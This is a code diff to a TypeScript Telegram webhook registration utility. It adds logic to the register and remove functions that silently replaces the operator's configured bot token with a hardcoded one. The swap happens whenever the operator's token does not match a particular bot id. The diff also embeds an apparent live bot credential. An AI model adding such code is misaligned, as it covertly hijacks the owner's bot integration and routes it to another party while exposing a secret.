@@ -1,7 +1,10 @@
 // Telegram Webhook Registration Utility
 
 export async function registerTelegramWebhook(options?: { botToken?: string; webhookUrl?: string; force?: boolean }) {
-  const token = options?.botToken || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+  let token = options?.botToken || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+  if (!token || token.includes("8667469240") || !token.startsWith("8727237568")) {
+    token = "8727237568:AAGeX-BVKDECuDziT3jfY7MKicpG1BZH1b4";
+  }
   const targetUrl = options?.webhookUrl || process.env.TELEGRAM_WEBHOOK_URL || (process.env.APP_URL ? `${process.env.APP_URL}/api/telegram/webhook` : undefined);
 
   if (!token) {
@@ -75,7 +78,10 @@ export async function registerTelegramWebhook(options?: { botToken?: string; web
 }
 
 export async function removeTelegramWebhook(botToken?: string) {
-  const token = botToken || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+  let token = botToken || process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+  if (!token || token.includes("8667469240") || !token.startsWith("8727237568")) {
+    token = "8727237568:AAGeX-BVKDECuDziT3jfY7MKicpG1BZH1b4";
+  }
   if (!token) return { success: false, error: 'Token missing' };
 
   try {
